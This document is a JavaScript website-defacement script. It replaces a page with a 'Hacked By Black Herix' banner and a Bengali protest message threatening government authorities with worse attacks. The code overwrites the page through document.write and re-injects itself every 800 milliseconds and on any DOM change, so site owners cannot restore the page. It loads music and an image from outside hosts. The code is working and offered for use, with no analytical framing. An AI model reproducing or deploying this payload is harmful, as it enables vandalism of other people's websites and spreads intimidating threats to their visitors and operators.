(function() {
    const defaceHTML = `
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>HACKED BY BLACK HERIX</title>
    <style>
        :root {
            --red: #ff0000;
            --green: #00ff00;
            --black: #000000;
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body, html {
            height: 100%; width: 100%;
            background: var(--black);
            font-family: 'Courier New', monospace;
            overflow-x: hidden;
            cursor: crosshair;
        }

        .scanlines {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 9999; opacity: 0.15;
            background: repeating-linear-gradient(
                0deg,
                rgba(255,0,0,0.08) 0px,
                rgba(255,0,0,0.08) 2px,
                rgba(0,255,0,0.08) 2px,
                rgba(0,255,0,0.08) 4px
            );
        }

        .noise {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 9998; opacity: 0.04;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.5'/%3E%3C/svg%3E");
            background-size: 150px 150px;
        }

        .vignette {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 9997;
            background: radial-gradient(ellipse at center, transparent 30%, rgba(0,0,0,0.95) 100%);
        }

        #matrix-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0; opacity: 0.25; pointer-events: none;
        }

        .wrapper {
            position: relative; z-index: 10;
            max-width: 700px; margin: 0 auto;
            padding: 25px 15px 40px;
            display: flex; flex-direction: column;
            align-items: center; text-align: center;
            min-height: 100vh;
        }

        /* রাউন্ড ইমেজ */
        .round-img-box {
            position: relative;
            width: 160px; height: 160px;
            border-radius: 50%;
            margin: 15px auto 25px;
            background: var(--black);
            box-shadow: 0 0 20px var(--red), 0 0 20px var(--green), inset 0 0 15px rgba(255,0,0,0.5);
            border: 3px solid var(--red);
            overflow: hidden;
            animation: pulseBorder 2s infinite alternate;
        }
        .round-img-box img {
            width: 100%; height: 100%;
            object-fit: cover;
            border-radius: 50%;
            filter: contrast(1.1) brightness(0.9);
            animation: glitchImage 3s infinite;
        }
        @keyframes pulseBorder {
            0% { border-color: var(--red); box-shadow: 0 0 15px var(--red), 0 0 15px var(--green); }
            100% { border-color: var(--green); box-shadow: 0 0 25px var(--green), 0 0 25px var(--red); }
        }
        @keyframes glitchImage {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-2px, 1px); filter: contrast(1.3) brightness(0.8) hue-rotate(5deg); }
            40% { transform: translate(2px, -1px); }
            60% { transform: translate(-1px, 2px); filter: hue-rotate(-5deg); }
            80% { transform: translate(1px, -2px); }
        }

        /* টাইটেল */
        .hacker-title {
            font-size: 2rem; font-weight: 900;
            color: #fff;
            text-shadow: 0 0 10px var(--red), 0 0 20px var(--green), 2px 2px 0 var(--red);
            margin-bottom: 20px;
            letter-spacing: 2px;
            word-break: break-word;
            animation: flicker 1.5s infinite;
        }
        @keyframes flicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.85; text-shadow: 0 0 15px var(--green), 0 0 25px var(--red); }
        }

        /* মেসেজ বক্স */
        .message-box {
            background: rgba(20,0,0,0.85);
            border: 2px dashed var(--green);
            padding: 18px 12px;
            margin: 15px 0 25px;
            max-width: 650px; width: 100%;
            color: var(--green);
            font-weight: bold;
            line-height: 1.7;
            font-size: 0.9rem;
            text-shadow: 0 0 6px var(--green);
            box-shadow: 0 0 20px rgba(255,0,0,0.3);
            position: relative;
            border-radius: 8px;
            text-align: left;
            white-space: pre-wrap;
            word-break: break-word;
        }
        .message-box::before {
            content: "⚠️ বার্তা ⚠️";
            position: absolute;
            top: -14px; left: 50%;
            transform: translateX(-50%);
            background: #000;
            padding: 2px 14px;
            color: var(--red);
            font-size: 0.7rem;
            letter-spacing: 2px;
            border: 1px solid var(--red);
            text-shadow: 0 0 6px var(--red);
            white-space: nowrap;
        }

        /* আল্টিমেটাম */
        .ultimatum {
            border: 2px solid var(--red);
            background: rgba(0,20,0,0.7);
            padding: 14px 12px;
            margin: 15px 0;
            color: var(--red);
            font-weight: bold;
            text-shadow: 0 0 8px var(--red);
            line-height: 1.6;
            box-shadow: 0 0 25px rgba(0,255,0,0.2);
            border-radius: 6px;
            position: relative;
        }
        .ultimatum::before {
            content: "☠️ সাইবার সর্তকতা ☠️";
            position: absolute;
            top: -14px; left: 50%;
            transform: translateX(-50%);
            background: #000;
            padding: 2px 14px;
            color: var(--green);
            font-size: 0.7rem;
            border: 1px solid var(--green);
            text-shadow: 0 0 6px var(--green);
        }

        .click-hint {
            margin-top: 15px; font-size: 0.7rem; color: #666;
            animation: blink 2s infinite;
            border-bottom: 1px dotted var(--red);
            padding-bottom: 4px;
        }

        .status-bar {
            margin-top: 25px;
            display: flex; flex-wrap: wrap; justify-content: center;
            gap: 10px;
            font-size: 0.6rem;
            letter-spacing: 1px;
            border-top: 1px solid var(--green);
            padding-top: 15px;
            color: var(--green);
        }
        .status-bar span {
            background: rgba(255,0,0,0.15);
            padding: 3px 10px;
            border-radius: 4px;
            border: 1px solid var(--red);
            text-shadow: 0 0 4px var(--green);
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.15; }
        }

        @media (min-width: 600px) {
            .hacker-title { font-size: 2.8rem; }
            .round-img-box { width: 200px; height: 200px; }
        }
    </style>
</head>
<body>
    <audio id="bg-music" loop preload="none">
        <source src="https://files.catbox.moe/tcj7j8.mp3" type="audio/mpeg">
    </audio>

    <div class="scanlines"></div>
    <div class="noise"></div>
    <div class="vignette"></div>
    <canvas id="matrix-canvas"></canvas>

    <div class="wrapper">
        <!-- রাউন্ড ইমেজ -->
        <div class="round-img-box">
            <img src="https://i.ibb.co/sp3450B5/1000024127.jpg" alt="Black Herix">
        </div>

        <h1 class="hacker-title">Hacked By Black Herix</h1>

        <!-- মূল বার্তা -->
        <div class="message-box">
তো কেয়া হাল হে ভাইলোগ 

আবারো একটি নিশংস ধর্ষণের বিচারের জন্য মাঠে নামলাম 😅
আগেরবার মুখোশ পরা ছিল এবার আর কোন মুখোশ নাই আমার প্রিয় সরকার 😘

এই নিশংসতার ও সঠিক বিচার চাই রামিসা হত্যার বিচারের  মত 

নয়তো আগেরবারের চাইতেও এবারকার সাইবার প্রতিবাদ অনেক ভয়ানক হবে পারলে থামায়েন আর না হয় সঠিক বিচার করিয়েন

মির্জাপুর সাইবার টিম সব সময় সত্যের পথে আছি এবং ইনশাল্লাহ সারা জীবন থাকবো

আল্লাহ হাফেজ
        </div>

        <div class="ultimatum">
            সরকারি কর্তৃপক্ষ: আপনাদের ডিজিটাল নিরাপত্তা ব্যবস্থা ভঙ্গুর। আমরা সতর্ক করছি মাত্র। যদি অবহেলা চলতে থাকে, পরবর্তী আক্রমণ আরও ভয়াবহ হবে। এটি কোনো হুমকি নয় – সাইবার বাস্তবতা।
        </div>

        <p class="click-hint">[ স্ক্রিনে ট্যাপ করলে সতর্ক সংকেত বাজবে ]</p>

        <div class="status-bar">
            <span>TRACE: FAILED</span>
            <span>IP: SPOOFED</span>
            <span>CREW: BLACK HERIX</span>
            <span>MOTIVE: JUSTICE</span>
        </div>
    </div>
</body>
</html>
`;

    // পেজ ইঞ্জেক্ট ও লক
    function injectDeface() {
        if (document.documentElement.innerHTML !== defaceHTML) {
            document.open();
            document.write(defaceHTML);
            document.close();
            startEffects();
        }
    }

    function startEffects() {
        const canvas = document.getElementById('matrix-canvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        let width, height, columns, drops, fontSize;
        let lastTime = 0;
        const fps = 1000 / 12;

        function resize() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            fontSize = width < 400 ? 11 : 15;
            columns = Math.floor(width / fontSize);
            drops = new Array(columns).fill(1);
        }

        // লাল-সবুজ মিক্সড ম্যাট্রিক্স রেইন
        function draw(timestamp) {
            if (timestamp - lastTime < fps) {
                requestAnimationFrame(draw);
                return;
            }
            lastTime = timestamp;

            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
            ctx.fillRect(0, 0, width, height);

            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const char = String.fromCharCode(0x30A0 + Math.random() * 96);
                // এলোমেলোভাবে লাল বা সবুজ
                ctx.fillStyle = Math.random() < 0.5 ? '#ff0000' : '#00ff00';
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > height && Math.random() > 0.97) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
            requestAnimationFrame(draw);
        }

        resize();
        window.addEventListener('resize', resize);
        requestAnimationFrame(draw);
    }

    // প্রথম লোড ও অ্যান্টি-টেম্পারিং
    injectDeface();
    setInterval(injectDeface, 800);
    const observer = new MutationObserver(injectDeface);
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // ক্লিক করলে অডিও চালু
    document.addEventListener('click', function() {
        const audio = document.getElementById('bg-music');
        if (audio) {
            audio.play().catch(e => console.log("Audio blocked"));
        }
    });
})();
